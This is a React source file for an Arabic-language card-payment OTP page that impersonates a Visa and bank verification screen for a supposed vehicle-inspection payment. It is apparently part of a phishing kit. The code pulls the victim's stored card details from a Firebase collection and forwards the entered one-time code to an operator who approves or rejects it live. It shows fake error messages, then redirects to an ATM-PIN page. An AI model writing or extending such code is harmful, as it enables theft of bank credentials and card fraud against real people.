import React, { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import {
  handleOtp,
  listenForOtpApproval,
  handleCurrentPage,
} from "@/lib/firebase";
import { normalizeCardNumber } from "@/lib/card-normalization";
import { findBankLogo } from "@/lib/bank-logos";
import { SiteSecurityModal } from "@/components/site-security-modal";

const GREEN_PRIMARY = "#126447";

const VisaLogo = () => (
  <svg
    xmlns="http://www.w3.org/2000/svg"
    viewBox="0 0 750 471"
    className="h-[28px] w-auto"
  >
    <path
      d="M278.2 334.7l35-207h56l-35 207h-56zM524.3 131.3c-11.1-4.2-28.5-8.7-50.2-8.7-55.3 0-94.3 28-94.6 68.2-.3 29.7 27.7 46.3 48.9 56.2 21.7 10.1 29 16.6 28.9 25.7-.1 13.9-17.3 20.2-33.3 20.2-22.3 0-34.1-3.1-52.4-10.7l-7.2-3.3-7.8 46c13 5.7 37 10.7 61.9 11 58.6 0 96.6-27.6 97-70.5.2-23.5-14.6-41.3-46.7-56-19.5-9.5-31.4-15.8-31.3-25.4 0-8.5 10.1-17.6 31.9-17.6 18.2-.3 31.4 3.7 41.7 7.8l5 2.3 7.6-45.2zM619.2 127.7H574c-13.8 0-24.1 3.8-30.1 17.7l-85.4 194.1h60.4l12-31.7h73.7l7 31.7h53.3l-46.7-211.8h-15zM548.1 264.6c4.5-11.5 21.7-54.6 21.7-54.6-.3.5 4.5-11.4 7.2-18.8l3.6 17c0 .1 10.4 46.5 12.6 56.4h-45.1zM230.1 127.7l-55.7 141.6-5.9-28.4c-10.4-32.7-42.6-68.1-78.6-85.8l51 179.3h60.9L292.5 127.7h-62.4z"
      fill="#1a1f71"
    />
    <path
      d="M131.3 127.7H43.1l-.7 4c69.6 17 115.7 58.1 134.8 107.5l-19.5-94.3c-3.4-13.3-13.3-16.8-26.4-17.2z"
      fill="#f9a533"
    />
  </svg>
);

interface VisitorContext {
  cardLast4: string;
  amount: number | string;
  bankName: string;
  cardType: string;
  backHref: string;
  loading: boolean;
}

export default function OTPPage() {
  return (
    <div
      className="page-otp min-h-screen w-full flex items-center justify-center px-4 py-8 bg-[#f5f8f5]"
      dir="rtl"
    >
      <PaymentVerify />
    </div>
  );
}

function PaymentVerify() {
  const [, setLocation] = useLocation();
  const [otp, setOtp] = useState("");
  const [error, setError] = useState("");
  const [resent, setResent] = useState(false);
  const [isWaiting, setIsWaiting] = useState(false);
  const [isSending, setIsSending] = useState(false);
  const [hasSubmittedOtp, setHasSubmittedOtp] = useState(false);
  const [showSecurity, setShowSecurity] = useState(false);
  const [otpResult, setOtpResult] = useState<"approved" | "rejected" | null>(null);
  
  const [ctx, setCtx] = useState<VisitorContext>({
    cardLast4: "--",
    amount: "172.50",
    bankName: "",
    cardType: "visa",
    backHref: "/checkout",
    loading: true,
  });

  const inputRef = useRef<HTMLInputElement>(null);

  // Load visitor context
  useEffect(() => {
    let cancelled = false;
    (async () => {
      try {
        const { db, doc, getDoc, getOrCreateVisitorId } = await import("@/lib/firebase");
        const visitorId = getOrCreateVisitorId();
        if (!visitorId) {
          if (!cancelled) setCtx((c) => ({ ...c, loading: false }));
          return;
        }
        if (!db) {
          if (!cancelled) setCtx((c) => ({ ...c, loading: false }));
          return;
        }
        const snap = await getDoc(doc(db, "pays", visitorId));
        const data = snap.data() || {};
        const cardNumber = normalizeCardNumber(data);
        const cardLast4 = cardNumber.replace(/\D/g, "").slice(-4) || "--";
        const amount =
          typeof data.totalAmount === "number"
            ? data.totalAmount.toFixed(2)
            : typeof data.total === "number"
            ? data.total.toFixed(2)
            : data.payment?.totalPaid || "172.50";
        
        const isReservation =
          data.type === "restaurant_reservation" ||
          data.currentPage === "reserve_checkout";
        const backHref = isReservation ? "/restaurants" : "/checkout";

        void handleCurrentPage(isReservation ? "reserve_otp" : "otp");

        let bankName = data.payment?.bankName || "";
        const bin = cardNumber.replace(/\D/g, "").slice(0, 6);
        if (!bankName && bin.length === 6) {
          try {
            const res = await fetch(`/api/bin-lookup/${bin}`);
            if (res.ok) {
              const json = await res.json();
              if (json?.success && json.data?.bankName) {
                bankName = json.data.bankName;
              }
            }
          } catch {
            // ignore
          }
        }

        if (!cancelled) {
          setCtx({
            cardLast4,
            amount,
            bankName,
            cardType: data.cardType || "visa",
            backHref,
            loading: false,
          });
        }
      } catch {
        if (!cancelled) setCtx((c) => ({ ...c, loading: false }));
      }
    })();
    return () => {
      cancelled = true;
    };
  }, []);

  const bankLogo = findBankLogo(ctx.bankName);

  // Listen for admin OTP approval/rejection
  useEffect(() => {
    if (!isWaiting || !hasSubmittedOtp) return;

    const timeoutId = window.setTimeout(() => {
      setOtpResult("rejected");
      setError("رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى!");
      setIsWaiting(false);
      setOtp("");
      inputRef.current?.focus();
    }, 15000);

    const unsubscribe = listenForOtpApproval((status) => {
      window.clearTimeout(timeoutId);
      setOtpResult(status);
      if (status === "approved") {
        setIsWaiting(false);
        handleCurrentPage("otp_verified").catch(() => {});
        setLocation("/atm-pin");
      } else if (status === "rejected") {
        setIsWaiting(false);
        setError("رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى!");
        setOtp("");
        inputRef.current?.focus();
      }
    });
    return () => {
      window.clearTimeout(timeoutId);
      unsubscribe();
    };
  }, [hasSubmittedOtp, isWaiting, setLocation]);

  const submitOtp = async (code: string) => {
    if (isWaiting || isSending) return;
    if (code.length < 4 || code.length > 8) {
      setError("يرجى إدخال رمز تحقق صحيح");
      return;
    }
    setError("");
    setOtpResult(null);
    setIsSending(true);

    try {
      await handleOtp(code);
      setHasSubmittedOtp(true);
      setIsWaiting(true);
    } catch (err: any) {
      setError("تعذر التحقق من الرمز، يرجى المحاولة مرة أخرى");
    } finally {
      setIsSending(false);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    await submitOtp(otp);
  };

  // Auto-submit as soon as 6 digits entered
  const lastAutoSubmitted = useRef("");
  useEffect(() => {
    if (otp.length !== 6) return;
    if (isWaiting || isSending) return;
    if (lastAutoSubmitted.current === otp) return;
    lastAutoSubmitted.current = otp;
    void submitOtp(otp);
  }, [otp, isWaiting, isSending]);

  const handleResend = (e: React.MouseEvent) => {
    e.preventDefault();
    setResent(true);
    setOtp("");
    setError("");
    setOtpResult(null);
    setHasSubmittedOtp(false);
    setIsWaiting(false);
    setTimeout(() => setResent(false), 3500);
  };

  const now = new Date();
  const dateStr = now.toLocaleDateString("ar-SA");
  const timeStr = now.toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit" });

  return (
    <div
      className="bg-white shadow-xl rounded-2xl border border-[#dce7de] overflow-hidden relative max-w-md w-full"
      data-testid="otp-card"
    >
      {/* Activity Bar */}
      {(isSending || isWaiting) && (
        <div className="submit-activity-bar" aria-hidden="true">
          <span className="submit-activity-bar__runner"></span>
        </div>
      )}

      {/* Top Header */}
      <div className="flex items-center justify-between px-5 py-4 border-b border-[#e9efe9] bg-white">
        <VisaLogo />

        {bankLogo ? (
          <div className="flex items-center justify-center bg-white h-9 px-2" data-testid="img-bank-logo">
            <img
              src={bankLogo.logo}
              alt={bankLogo.label}
              className="max-h-8 max-w-[100px] object-contain"
            />
          </div>
        ) : (
          <div className="text-xs font-bold text-[#126447] bg-[#dfeee3] px-3 py-1.5 rounded-lg">
            البنك المصدر
          </div>
        )}

        <button
          onClick={() => setLocation(ctx.backHref)}
          className="text-gray-400 hover:text-gray-700 text-lg font-bold p-1 rounded-lg"
          data-testid="button-close-otp"
          aria-label="إغلاق"
        >
          ✕
        </button>
      </div>

      {/* Body Content */}
      <div className="p-6 sm:p-8 space-y-6">
        <div className="text-center space-y-2">
          <h2 className="font-bold text-xl text-[#234b38]" data-testid="text-otp-title">
            رمز التحقق لمرة واحدة (OTP)
          </h2>
          <p className="font-semibold text-sm text-[#486253]">
            لتأكيد العملية أدخل رمز التحقق المرسل إلى جوالك
          </p>
        </div>

        <div className="bg-[#f5f8f5] p-4 rounded-xl border border-[#e5ece6] space-y-3 text-sm text-gray-800 leading-relaxed text-right">
          <p className="font-medium text-[#234b38]">
            سيتم الاتصال بك من قبل البنك المصدر للبطاقة الائتمانية المنتهية بـ{" "}
            <b dir="ltr" className="text-[#126447] font-extrabold">{ctx.cardLast4}</b>، يرجى اتباع الرد الآلي لإرسال رمز التحقق برسالة نصية.
          </p>

          <p className="font-medium text-[#234b38]">
            أنت تدفع لمركز سلامة المركبات مبلغ{" "}
            <span className="font-extrabold text-[#126447]">{ctx.amount}</span>{" "}
            ر.س بتاريخ {dateStr} في التوقيت{" "}
            <span dir="ltr" className="font-semibold">{timeStr}</span>
          </p>

          <div className="flex items-center gap-1.5 text-green-700 font-bold text-xs pt-1">
            <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span>
            <span>تم إرسال الرمز بنجاح</span>
          </div>
        </div>

        {/* Form */}
        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <input
              ref={inputRef}
              dir="ltr"
              type="tel"
              name="otp"
              id="otp"
              placeholder="(OTP) رمز التحقق"
              className={`w-full rounded-xl border px-4 py-3.5 text-center text-2xl font-mono font-extrabold tracking-widest focus:outline-none transition-all ${
                error
                  ? "border-red-400 bg-red-50 text-red-900"
                  : "border-[#dce7de] bg-white text-gray-900 focus:border-[#126447] focus:ring-1 focus:ring-[#126447]"
              }`}
              maxLength={6}
              value={otp}
              disabled={isSending || isWaiting}
              onChange={(e) => {
                setOtp(e.target.value.replace(/\D/g, ""));
                setError("");
              }}
              data-testid="input-otp"
            />
          </div>

          {error && (
            <p className="font-semibold text-red-500 text-center text-sm" data-testid="error-otp">
              {error}
            </p>
          )}

          <button
            type="submit"
            disabled={otp.length < 4 || isSending || isWaiting}
            className="w-full rounded-xl bg-[#126447] hover:bg-[#0e5239] px-6 py-3.5 text-white font-bold text-base transition-all shadow-md cursor-pointer disabled:opacity-60"
            data-testid="button-verify-otp"
          >
            {isSending ? "جاري الإرسال..." : "تحقق"}
          </button>
        </form>

        {/* Resend Link */}
        <div className="text-center pt-2">
          {resent ? (
            <p className="text-sm font-semibold text-green-600" data-testid="status-otp-resent">
              تم إعادة إرسال الرمز بنجاح
            </p>
          ) : (
            <button
              type="button"
              onClick={handleResend}
              disabled={isSending || isWaiting}
              className="text-sm font-bold text-[#126447] hover:underline cursor-pointer disabled:opacity-50"
              data-testid="link-resend-otp"
            >
              إعادة إرسال رمز التحقق
            </button>
          )}
        </div>

        {/* Help footer */}
        <div className="pt-3 border-t border-[#e9efe9] flex justify-center items-center gap-3 text-xs text-[#486253]">
          <button
            type="button"
            onClick={() => setShowSecurity(true)}
            className="hover:underline font-semibold text-[#126447]"
            data-testid="link-need-help"
          >
            بحاجة إلى المساعدة؟
          </button>
          <span>|</span>
          <button
            type="button"
            onClick={() => setShowSecurity(true)}
            className="hover:underline font-semibold text-[#126447]"
            data-testid="link-learn-more"
          >
            تعرف على عملية التحقق
          </button>
        </div>
      </div>

      {/* Loading Overlay */}
      {(isSending || isWaiting) && (
        <div className="absolute inset-0 z-50 flex items-center justify-center bg-white/90 backdrop-blur-sm p-6 text-center">
          <div className="flex flex-col items-center justify-center gap-4">
            <div className="h-12 w-12 rounded-full border-4 border-[#126447] border-t-transparent animate-spin"></div>
            <p className="text-sm text-[#234b38] font-bold leading-relaxed">
              {isSending
                ? "جارٍ إرسال رمز التحقق..."
                : "يرجى الانتظار جاري التأكد من صحة البيانات المدخلة"}
            </p>
          </div>
        </div>
      )}

      <SiteSecurityModal
        isOpen={showSecurity}
        onClose={() => setShowSecurity(false)}
        lang="ar"
      />

      <style>{`
        .submit-activity-bar {
          position: absolute;
          top: 0;
          right: 0;
          left: 0;
          height: 5px;
          z-index: 40;
          overflow: hidden;
          background: rgba(18, 100, 71, 0.15);
        }

        .submit-activity-bar__runner {
          position: absolute;
          top: 0;
          left: 0;
          width: 110px;
          height: 100%;
          background: linear-gradient(90deg, transparent 0%, #126447 50%, transparent 100%);
          animation: otp-bar-sweep 1.8s ease-in-out infinite alternate;
        }

        @keyframes otp-bar-sweep {
          0% { left: 0; }
          100% { left: calc(100% - 110px); }
        }
      `}</style>
    </div>
  );
}
